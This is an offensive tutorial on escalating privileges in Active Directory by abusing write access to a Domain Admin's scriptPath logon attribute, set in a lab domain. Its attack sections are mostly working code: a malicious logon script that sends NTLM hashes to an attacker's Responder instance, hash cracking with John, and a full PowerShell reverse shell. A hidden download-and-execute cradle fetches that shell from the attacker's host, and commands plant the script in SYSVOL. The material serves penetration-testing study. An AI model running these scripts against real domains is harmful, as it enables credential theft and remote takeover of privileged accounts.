## What is a Logon Script?

A logon script is executed automatically when a user logs into a system. It is commonly used in Active Directory environments to perform actions like mapping network drives, syncing time, or configuring printers. These scripts are typically written with `.bat`, `.cmd`, or `.vbs` extensions.

For example, in a corporate network where all employees access a shared drive, a simple logon script can be used:

```
@echo off
:: Map shared network drive
net use S: \\fileserver\shared /persistent:no

:: Sync time with domain controller
w32tm /resync /nowait

:: Create a basic log
echo %USERNAME% logged in at %DATE% %TIME% >> \\fileserver\logs\logon_activity.log
```

This script ensures the user’s time is synced to avoid authentication issues, maps a shared drive, and logs each login event to a central file.

On Windows 8.1-based computers, the default delay before a logon script runs is 5 minutes if no configuration is applied. This delay is designed to improve desktop load times.

The delay time can be modified by configuring the **Configure Logon Script Delay** Group Policy setting, located at:

```
Computer Configuration
  └─ Administrative Templates
       └─ System
            └─ Group Policy
```

By disabling this setting, logon scripts will run immediately at user logon without any delay. Alternatively, you can enable the setting and specify a custom delay time in minutes.


## Script-Path attribute

The **Script Path** attribute is an **Active Directory attribute** that specifies the logon script filename to be executed when a user logs into the domain.

Although the **Script Path** attribute only stores the **name of the script file**, the actual script file must be placed in a specific location on a **Domain Controller**:

Physical path (on the DC):

```
C:\Windows\SYSVOL\sysvol\<domain_name>\scripts
```

Network shared path (used by clients):

```
\\<domain_name>\netlogon
```

### How to Set the Script Path:

- Open **Active Directory Users and Computers.**

- Right-click on the desired user and select **Properties.**

- Go to the **Profile** tab.

- In the **Logon script** field, enter the name of the script file (e.g., Script.bat).

Here the domain is `furious.local` and your script file is `Script.bat`, place the file in:

```
C:\Windows\SYSVOL\sysvol\furious.local\scripts\Script.bat
```

**Attribute Metadata**

- **CN** `Script-Path`

- **LDAP Display** `NamescriptPath`

- **System-Id-Guid** `bf9679a8-0de6-11d0-a285-00aa003049e2`

## Abusing `WriteScriptPath` for Privilege Escalation

Now that we understand what the scriptPath attribute does and where the script is stored, let’s walk through a **real-world scenario** that shows how this can be used for **privilege escalation** in an Active Directory environment.


### Scenario Overview

A member of the Tier 1 Support team has **WriteProperty** permissions on the `scriptPath` attribute of several users. Due to internal restructuring, one of these users—**tempadmin**—was temporarily promoted to the **Domain Admins** group. However, the **WriteProperty** permission for the support user on tempadmin's account was never revoked. This oversight introduced a potential privilege escalation path.

Lab Setup (PowerShell):

```powershell
# Create two AD users: John Carter and Emily Rhodes (tempadmin)
New-ADUser -Name "John Carter" -SamAccountName jcarter -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true -Path "CN=Users,DC=furious,DC=local"
New-ADUser -Name "Emily Rhodes" -SamAccountName erhodes -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true -Path "CN=Users,DC=furious,DC=local"

# Create Tier 1 Support group
New-ADGroup -Name "Tier 1 Support" -SamAccountName Tier1Support -GroupScope Global -GroupCategory Security -Path "CN=Users,DC=furious,DC=local"

# Add John Carter to Tier 1 Support group
Add-ADGroupMember -Identity "Tier1Support" -Members "jcarter"

# Add Emily Rhodes to Domain Admins group (as tempadmin)
Add-ADGroupMember -Identity "Domain Admins" -Members "erhodes"
```

<img src="assets/WriteScriptPath/image2.png" alt="Error loading image"/>


In order to give `WriteScriptPath` access, we will go to Active Directory Users and Computers, right-click on Emily Rhodes, go to the Security tab, and add the user Carter.

<img src="assets/WriteScriptPath/image3.png" alt="Error loading image"/>


Under the Advanced section, we will allow the user to **Write logon information.**

<img src="assets/WriteScriptPath/image4.png" alt="Error loading image"/>


So now the user jcarter can write a logon script for the user erhodes.

We also assigned the necessary permissions on the directory `C:\Windows\SYSVOL\sysvol\furious.local\scripts` to the `jcarter` user to allow script uploading. This was achieved by executing the following PowerShell command:

```
$path = "C:\\Windows\\SYSVOL\\sysvol\\furious.local\\scripts"
$user = "furious\\jcarter"  # Use domain\\username if domain user
$acl = Get-Acl $path
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "Modify", "ContainerInherit,ObjectInherit", "None", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path $path -AclObject $acl
```

## Uncovering scriptPath Permissions with Adalanche

One important point to note is that tools like BloodHound may not display the `WriteProperty ` permission on the `scriptPath` attribute. However, an alternative tool called **[Adalanche](https://github.com/lkarlslund/Adalanche)**, developed by *lkarlslund*, provides enhanced visualization and exploration capabilities. Adalanche can effectively identify such permissions and highlight potential privilege escalation paths.

To collect data using Adalanche, use the following command:

```
./adalanche-linux-x64-v2025.2.6 collect activedirectory \\
  --server 192.168.129.140 \\
  --username jcarter \\
  --password 'Password123' \\
  --domain furious.local \\
  --authmode ntlm \\
  --port 389 \\
  --tlsmode NoTLS
```

Once the data collection is complete, you can analyze and visualize the results by running the following command **from the same directory** where the data was collected:

```
./adalanche-linux-x64-v2025.2.6 analyze
```

<img src="assets/WriteScriptPath/image6.png" alt="Error loading image"/>


We can observe a privilege escalation path from **John Carter** to **Emily Rhodes**. There are two potential routes: **WriteScriptPath** and **WriteProfilePath**. However, we will focus on the WriteScriptPath method.

Using **BloodyAD**, we can verify that **John Carter** has **write access** on **Emily Rhodes**, which confirms our ability to exploit this path for privilege escalation.


```
bloodyAD --host 192.168.129.140 -d furious.local -u 'jcarter' -p 'Password123' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=furious,DC=local
permission: WRITE
distinguishedName: CN=John Carter,CN=Users,DC=furious,DC=local
permission: WRITE
distinguishedName: CN=Emily Rhodes,CN=Users,DC=furious,DC=local
permission: WRITE
```

### Enumeration from PowerShell

To enumerate it from Windows, we can see that jcarter has write access using:

```powershell
$domainController = "DC01-FURIOUS5.furious.local"
$userDN = (Get-ADUser -Identity erhodes).DistinguishedName
$user = [ADSI]"LDAP://$domainController/$userDN"
$sd = $user.psbase.ObjectSecurity
$sd.GetAccessRules($true, $true, [System.Security.Principal.NTAccount]) | Where-Object {
    $_.IdentityReference -like "*jcarter*"
}
```

<img src="assets/WriteScriptPath/image7.png" alt="Error loading image"/>

From PowerShell, we find something interesting — instead of `bf9679a8-0de6-11d0-a285-00aa003049e2` we see `5f202010-79a5-11d0-9020-00c04fc2d4cf`.

The reason is that this object type contains multiple writable properties, such as **scriptPath** and **profilePath**. If we check our configuration, we can see that the checkbox for writing logon information is enabled.

So, if we see any of these in the writable list, we can write to `scriptPath`.


## Privilege Escalation using This Abuse


There are different ways to abuse this misconfiguration, depending on the attacker’s intent. It can be used to add a new user, obtain an elevated shell, or exfiltrate credentials. In this example, we will focus on capturing the NTLM hash and to get a Reverse shell of a privileged user.

Our goal is to place a **malicious** script that runs when a Domain Admin logs in. This script will silently attempt to access a remote SMB share, triggering NTLM authentication and sending the hash to our Responder instance. The captured hash can later be cracked offline.

### Abusing `WriteScriptPath` from Windows

Step 1: Create a Malicious `script.bat`

```
@echo off
:: This command accesses a file on your SMB share to trigger NTLM auth
dir \\\\192.168.129.137\\share\\null.txt >nul 2>&1
```

Here, **192.168.129.137** is our IP address, and >nul 2>&1 ensures the command runs silently without displaying any output.

Step 2: Deploy the Script and Assign It to the User

Log in as the `jcarter` user and place the `script.bat` file in the following directory on the Domain Controller:

```
C:\\Windows\SYSVOL\sysvol\furious.local\scripts\
```

This location is part of the **SYSVOL share**, used to distribute logon scripts via Group Policy. When a domain user logs in — especially a privileged user — the script will execute automatically.

Next, assign the script to the user using the following PowerShell command:


```
Set-ADUser -Identity "erhodes" -ScriptPath "Script.bat"
```

This sets the `Script.bat` file as the logon script under the **Profile** tab of the `erhodes` user account.

Step 3: Set Up Responder to Capture Hash

The final step in this abuse technique is to set up Responder to capture NTLM hashes.

We run the following command:

```
sudo responder -I eth0
```

Once the user logs in, the hash is captured by Responder:

```

If the user’s password is weak, we can easily crack the hash offline using a wordlist. For example:


```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])

```

### Abusing `WriteScriptPath` from Linux

From Linux, we modify the scenario to obtain a reverse shell. To achieve a reverse shell on our listener by abusing the WriteScriptPath attribute, follow these steps:

Step 1: Prepare the PowerShell Reverse Shell

Create a PowerShell script (`shell.ps1`) to connect back to your listener. In this example, Windows Defender has been disabled, but bypassing Defender is possible and outside the scope of this guide.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.129.137",4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object byte[] 1024;
$encoding = New-Object System.Text.ASCIIEncoding;

while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $i);
    $sendback = (Invoke-Expression $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (Get-Location).Path + "> ";
    $sendbyte = $encoding.GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

Step 2: Serve the PowerShell Script Locally

Host the `shell.ps1` file using a simple Python HTTP server:

```
python3 -m http.server 80
```

Step 3: Prepare a Listener

Start a Netcat listener on your machine to catch the reverse shell:

```
nc -lvnp 4444
```

Step 4: Create a Batch Script to Download and Execute the PowerShell Script

Create `Script.bat` on your local machine with the following content:

```
@echo off
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.129.137/shell.ps1')"
```

Step 5: Upload the Batch Script to the Domain Controller’s SYSVOL Share

Use Impacket’s `smbclient` to upload the batch script:

```
impacket-smbclient furious.local/jcarter:Password123@192.168.129.140
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use SYSVOL
# cd furious.local/Scripts

# put Script.bat
# ls
drw-rw-rw-          0  Sat Aug  2 02:39:21 2025 .
drw-rw-rw-          0  Thu Apr 17 06:45:01 2025 ..
-rw-rw-rw-        122  Fri Aug  1 11:26:24 2025 Script.bat
#
```

Step 6: Assign the Logon Script via the scriptPath LDAP Attribute

Create an LDIF file (`modify_scriptpath.ldif`) to set the `scriptPath` attribute for the target user:

```
dn: CN=Emily Rhodes,CN=Users,DC=furious,DC=local
changetype: modify
replace: scriptPath
scriptPath: Script.bat
```

Apply the modification using `ldapmodify`:

```
ldapmodify -H ldap://192.168.129.140 -D "furious\jcarter" -W -f modify_scriptpath.ldif
Enter LDAP Password: 
modifying entry "CN=Emily Rhodes,CN=Users,DC=furious,DC=local"
```

After the user logs in, the batch script will execute, and you should receive a connection on your listener.
